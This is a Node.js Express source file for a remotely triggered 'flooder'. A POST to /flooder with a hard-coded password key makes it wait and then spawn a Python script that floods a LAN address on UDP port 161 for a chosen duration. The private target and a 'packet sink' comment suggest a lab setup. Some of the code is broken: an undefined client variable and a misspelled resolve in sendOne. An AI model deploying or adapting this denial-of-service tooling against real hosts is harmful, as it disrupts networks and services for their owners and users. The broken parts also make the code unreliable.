const express = require("express")
const bodyParser = require("body-parser")
const app = express();
//const http = require("http")
const dgram = require('dgram')

// var dgram = require("dgram"),
//     Commander  = require('commander'),
//     cluster = require('cluster'),
//     os = require('os'),
//     idleGC = require('idle-gc'),
//     q = require('q');

//data that gets send to the packet sink
msg = new Buffer ([
    0x08, 0x00, 0x43, 0x52, 0x00, 0x01, 0x0a, 0x09,
    0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
    0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
    0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
    0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69]
);

//Here we are configuring express to use body-parser as middle-ware.
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//Dummy react on a GET request, just sending some string
app.get("/", function(req,res) {
    res.send("This is the flooder")
})

//create a really large dummy string as data traffic
const data = 'x'.repeat(1024)

//React on the post request of the client at /flooder, only if key is a specific string
//runs the flood function
app.post('/flooder',function(req,res) {
    console.log("Got a post")
    if (req.body.key == 'ditiseensoortwachtwoord') {
        instruct_flooder(req.body.offset,req.body.duration) //launc flooder function
        res.writeHead(200, {'Content-Type': 'text/html'})
        res.end('Now flooding after ' + req.body.offset + ' for ' + req.body.duration + ' seconds')
    } else {
        console.log("Nevermind")
        res.writeHead(400, {'Content-Type': 'text/html'})
        res.end()
    }
})

function sendOne (ip,port) {
    return new Promise(function(resolev,reject){
        client.send(msg,0,msg.length,port,ip,function(err) {
            return err ? reject(err) : resolve()
        })
    })
}

//Waits <offset> seconds before flooding a host in the options constant
const instruct_flooder = async function(offset,duration) {
    //Waiting
    console.log("now waiting for " + offset + " seconds")
    await new Promise(resolve => setTimeout(resolve, offset * 1000));
    console.log("Now Flodding for " + duration + " seconds")

    const spawn = require("child_process").spawn;

    //Python arguments: packet_bin_ip, packet_bin_port, packet_size, duration
    const pythonProcess = spawn('python3',["flooder.py", '192.168.2.13', 161, 50,duration]);


    pythonProcess.stdout.on('data', (data) => {
        console.log(data)
    });

    console.log("Done")
}


//Listen on port 3000 for incoming requests
app.listen(3000,function() {
    console.log("listening on 3000")
})